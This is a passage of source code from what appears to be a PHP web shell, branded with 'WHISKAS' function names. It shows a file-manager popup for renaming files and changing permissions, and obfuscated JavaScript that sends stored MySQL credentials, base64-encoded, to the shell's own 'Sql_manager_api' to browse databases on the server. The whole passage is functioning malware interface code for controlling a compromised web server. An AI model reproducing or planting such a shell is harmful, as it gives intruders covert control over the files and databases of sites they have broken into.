wWwArALxpeC40AAYA0hUCMBnALABTAYwFcAlYHSByQSeAZgDvo/ts/+8BbADQYHBOlKP/A5UIRP7Y3K9MAAAAAElFTkSuQmCC\"> Delete</a>
</div>
<div id=\"filesman-tab-full-path\"></div>
<div id='alert-area' class='alert-area'></div>
<div class='cl-popup-fixed' style='display:none;'>
	<div id='shortcutMenu-holder'>
		<div class='popup-head'></div>
			<form autocomplete='off' onSubmit='return false;'>
				<label class='old-path-lbl'></label>
				<div style='overflow: hidden;white-space: nowrap;text-overflow: ellipsis;' class='old-path-content'></div>
				<label style='margin-top:10px;' class='new-filename-lbl'>New file name</label>
				<input type='text' name='fname'>
				<div class='perm-table-holder'>
					<table>
					   <tbody>
					      <tr>
					         <td><b>Mode</b></td>
					         <td>User</td>
					         <td>Group</td>
					         <td>World</td>
					      </tr>
					      <tr>
					         <td>Read</td>
					         <td><input type='checkbox' name='ur' value='4' onclick='calcperm();'></td>
					         <td><input type='checkbox' name='gr' value='4' onclick='calcperm();'></td>
					         <td><input type='checkbox' name='wr' value='4' onclick='calcperm();'></td></tr><tr><td>Write</td>
					         <td><input type='checkbox' name='uw' value='2' onclick='calcperm();'></td>
					         <td><input type='checkbox' name='gw' value='2' onclick='calcperm();'></td>
					         <td><input type='checkbox' name='ww' value='2' onclick='calcperm();'></td>
					      </tr>
					      <tr>
					         <td>Execute</td>
					         <td><input type='checkbox' name='ux' value='1' onclick='calcperm();'></td>
					         <td><input type='checkbox' name='gx' value='1' onclick='calcperm();'></td>
					         <td><input type='checkbox' name='wx' value='1' onclick='calcperm();'></td>
					      </tr>
					      <tr>
					         <td>Permission</td>
					         <td><input style='width:60px;' type='text' name='u' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"u\", [\"u\"]);'></td>
					         <td><input style='width:60px;' type='text' name='g' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"g\", [\"g\"]);'></td>
					         <td><input style='width:60px;' type='text' name='w' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"w\", [\"w\"]);'></td>
					      </tr>
					   </tbody>
					</table>
				</div>

			</form>
		<div class='popup-foot'>
			<button style='background: #2b5225;' name='accept' action='' onclick='WHISKASPopUpDoAction(this);'></button>
			<button style='background: #9e2c2c;' onclick='d.querySelector(\".cl-popup-fixed\").style.display=\"none\";'>Cancell</button>
		</div>
	</div>
</div>";?>
<script>
function WHISKASMysqlApi(e,t){var a={host:mysql_cache[e.db_id].host,user:mysql_cache[e.db_id].user,pass:mysql_cache[e.db_id].pass,db:e.db_target,db_id:e.db_id};if(e.hasOwnProperty("db_info"))for(var i in e.db_info)a[i]=e.db_info[i];var l={a:WHISKASb64("Sql_manager_api"),c_:WHISKASb64(c_),WHISKAS1:WHISKASb64(JSON.stringify(a))};if(e.hasOwnProperty("post"))for(var i in e.post.hasOwnProperty("WHISKAS2")&&"load_data"!=e.post.WHISKAS2&&"page"!=e.post.WHISKAS2&&"edit"!=e.post.WHISKAS2&&"delete"!=e.post.WHISKAS2&&(d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-pager").innerHTML="",d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-reporter").innerHTML=""),e.post)l[i]=WHISKASb64(e.post[i]);var r="";for(var o in l)r+=o+"="+l[o]+"&";WHISKASloader(e.db_id,"block"),_Ajax(d.URL,r,function(a){WHISKASloader(e.db_id,"none"),t(a)},!0,e.db_id)}function WHISKASMysqlFilterTable(e,t){setTimeout(function(){var a="",i="",l=(a="","");if(null!=e)a=e.getAttribute("target"),i=e.getAttribute("db_id"),l=e.value;else a=t.target,i=t.db_id,l=t.value;l=new RegExp(l,"i"),d.querySelectorAll("#"+i+" "+a+" ul > li").forEach(function(e){var t=e.querySelector(".mysql_tables");if(null==t)return!1;-1==(t=t.innerText).search(l)?e.style.display="none":e.style.display="block"})},200)}function WHISKASMysqlFilterAllTable(e,t){var a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" .mysql-tables input[name=filter_all]").value,l=d.querySelector("#"+a+" input[name=sql_count]").checked,r=[],o=[];if(d.querySelectorAll("#"+a+" .mysql-tables .list_container").forEach(function(e){var t=e.getAttribute("mode"),a=e.getAttribute("db_name");"no"==t&&r.push(a),o.push(a)}),r.length>0){if(0==i.length&&void 0===t)return!1;WHISKASMysqlApi({db_id:a,db_target:r[0],ajax_id:"mysql_get_all_tables",db_info:{databases:r},post:{WHISKAS2:"load_all_tables",WHISKAS3:l}},function(r){if(0!=r.length){for(var o in r=JSON.parse(r)){var n=o,s=d.querySelector("#"+a+" .cls-"+n);WHISKASMysqlMakeTblList(r[o],s,a,n,l)}void 0===t?WHISKASMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}):(e.setAttribute("mode","opened"),d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="data:image/png;base64,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